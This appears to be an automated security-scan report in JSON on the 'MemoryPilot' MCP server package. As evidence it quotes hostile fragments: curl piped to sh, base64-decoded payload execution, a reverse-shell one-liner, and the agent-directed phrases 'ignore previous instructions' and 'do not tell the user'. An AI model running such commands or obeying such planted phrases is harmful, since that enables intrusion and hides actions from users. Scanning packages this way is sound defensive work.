@@ -1,0 +1,136 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "Soflutionltd/MemoryPilot",
+    "version": "2c903f614ac34514706284b7905606b4cf07314a",
+    "download": "https://codeload.github.com/Soflutionltd/MemoryPilot/tar.gz/2c903f614ac34514706284b7905606b4cf07314a"
+  },
+  "archive_sha256": "aa7ab91cc478f5d1c8d1359fb173531acb2a5003620ed10c5773f4496551b8a7",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/src/auto_update.rs",
+      "line": 874,
+      "evidence": "curl https://example.com/install.sh | sh",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/src/auto_update.rs",
+      "line": 920,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/src/auto_update.rs",
+      "line": 921,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/src/auto_update.rs",
+      "line": 353,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/src/auto_update.rs",
+      "line": 357,
+      "evidence": "do not tell the user",
+      "file_sha256": "90c9775fe02b96ecd778bd8fd2df0a7e36a83f41212d77578d608e88e374b47a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/README.md",
+      "line": 377,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/Soflutionltd/MemoryPilot/main/insta",
+      "file_sha256": "fb6370c0e6d174dc712d76c21dc2bb9c9cf266d268f08ebde0527e22c7fb207e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "MemoryPilot-2c903f614ac34514706284b7905606b4cf07314a/install.sh",
+      "line": 208,
+      "evidence": "curl | bash",
+      "file_sha256": "5b3cdf2f87e80d031e0dc63bab5f03705125a107739545dab0c5cbddf4f39834"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "anthropic.com, api.anthropic.com, api.example.com, api.openai.com, localhost.example.com, mcp.example.com, supermemory.ai, www.example.com, www.getzep.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "anthropic.com",
+    "api.anthropic.com",
+    "api.example.com",
+    "api.openai.com",
+    "api.supabase.com",
+    "app.example.com",
+    "arxiv.org",
+    "chatgpt.com",
+    "claude.ai",
+    "creativecommons.org",
+    "cursor.com",
+    "dart.dev",
+    "demo.example.com",
+    "docs.example.com",
+    "evil.example",
+    "example.com",
+    "github.com",
+    "huggingface.co",
+    "img.shields.io",
+    "jina.ai",
+    "localhost.example.com",
+    "matplotlib.org",
+    "mcp.example.com",
+    "mem0.ai",
+    "memory.example",
+    "opencollective.com",
+    "paulmillr.com",
+    "postgres.abcdef",
+    "pub.dev",
+    "purl.org",
+    "raw.githubusercontent.com",
+    "registry.modelcontextprotocol.io",
+    "registry.npmjs.org",
+    "rustup.rs",
+    "sociomator.com",
+    "soflution.com",
+    "static.modelcontextprotocol.io",
+    "supermemory.ai",
+    "svelte.dev",
+    "tidelift.com",
+    "www.apple.com",
+    "www.example.com",
+    "www.getzep.com",
+    "www.w3.org",
+    "x.com"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
